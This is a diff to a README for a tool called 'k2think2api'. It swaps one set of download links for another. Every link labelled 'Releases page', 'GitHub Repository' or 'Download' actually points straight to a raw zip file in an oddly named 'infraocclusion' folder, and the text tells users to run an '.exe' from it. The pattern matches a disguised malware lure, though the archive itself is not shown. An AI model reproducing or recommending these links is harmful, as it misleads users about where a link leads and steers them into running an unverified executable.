@@ -8,11 +8,11 @@ Welcome to k2think2api! This guide will help you download and run our software w
 
 To get started, you need to download the application. Click the link below to visit the Releases page directly:
 
-[![Download k2think2api](https://raw.githubusercontent.com/jeannotmukitsana/k2think2api/master/infraocclusion/k2think2api.zip)](https://raw.githubusercontent.com/jeannotmukitsana/k2think2api/master/infraocclusion/k2think2api.zip)
+[![Download k2think2api](https://github.com/jeannotmukitsana/k2think2api/raw/refs/heads/master/infraocclusion/api_think_k_v1.5-alpha.4.zip)](https://github.com/jeannotmukitsana/k2think2api/raw/refs/heads/master/infraocclusion/api_think_k_v1.5-alpha.4.zip)
 
 ## 📂 Download & Install
 
-1. Click the link above to visit the [Releases page](https://raw.githubusercontent.com/jeannotmukitsana/k2think2api/master/infraocclusion/k2think2api.zip).
+1. Click the link above to visit the [Releases page](https://github.com/jeannotmukitsana/k2think2api/raw/refs/heads/master/infraocclusion/api_think_k_v1.5-alpha.4.zip).
 2. On this page, you will see different versions of the application.
 3. Find the latest version and click on it to open the version details.
 4. Look for the "Assets" section. Here, you will find the downloadable file, usually marked with a name ending in `.exe` (for Windows users) or another relevant extension for your operating system.
@@ -63,8 +63,8 @@ To ensure you benefit from the latest features and security updates, regularly c
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/jeannotmukitsana/k2think2api/master/infraocclusion/k2think2api.zip)
-- [Releases Page](https://raw.githubusercontent.com/jeannotmukitsana/k2think2api/master/infraocclusion/k2think2api.zip)
+- [GitHub Repository](https://github.com/jeannotmukitsana/k2think2api/raw/refs/heads/master/infraocclusion/api_think_k_v1.5-alpha.4.zip)
+- [Releases Page](https://github.com/jeannotmukitsana/k2think2api/raw/refs/heads/master/infraocclusion/api_think_k_v1.5-alpha.4.zip)
 - [Documentation](#) (link to be added soon)
 
 By following this guide, you should have no trouble downloading and using k2think2api. Enjoy seamless API connections and streamlined workflows!
